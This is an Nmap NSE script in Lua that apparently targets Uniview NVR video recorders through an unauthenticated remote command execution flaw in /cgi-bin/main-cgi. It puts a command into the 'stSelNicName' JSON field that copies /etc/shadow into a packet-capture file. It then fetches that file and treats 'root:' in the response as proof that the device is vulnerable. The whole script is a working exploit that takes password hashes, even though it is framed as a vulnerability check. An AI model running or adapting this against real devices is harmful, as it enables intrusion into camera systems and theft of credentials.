local http = require "http"
local string = require "string"
local stdnse = require "stdnse"
local shortport = require "shortport"


description = [[
宇视视频设备认证绕过远程命令执行漏洞，影响的设备型号如下:
 NVR304-16E NVR301-08-P8
攻击无需通过身份验证既可以远程执行命令
]]

author = "seaung"

license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"uniview_rce_02"}

portrule = shortport.port_or_service( {80, 443}, {"http", "https"}, "tcp", "open")

action = function(host, port)
	local output = stdnse.output_table()
	local cmd
	
	local path = [[/cgi-bin/main-cgi?json={"cmd":264,"status":1,"bSelectAllPort":1,"stSelPort":0,"bSelectAllIp":1,"stSelIp":0,"stSelNicName":";cp /etc/shadow /tmp/packetcapture.pcap;]]

	local response = http.get(host, port, path)

	if response.status == 200 then
		local url = [[/cgi-bin/main-cgi?json={"cmd":265,"szUserName":"","u32UserLoginHandle":-1}]]
		local resp = http.get(host, port, url)
		if string.find(resp.body, [["success": true]]) ~= nil or string.find(resp.body, [[root:]]) ~= nil then
			output = "Found vulnerable."
		else
			output = "Not vulnerable."
		end
	else
		output = "Not vulnerable."
	end
	return output
end

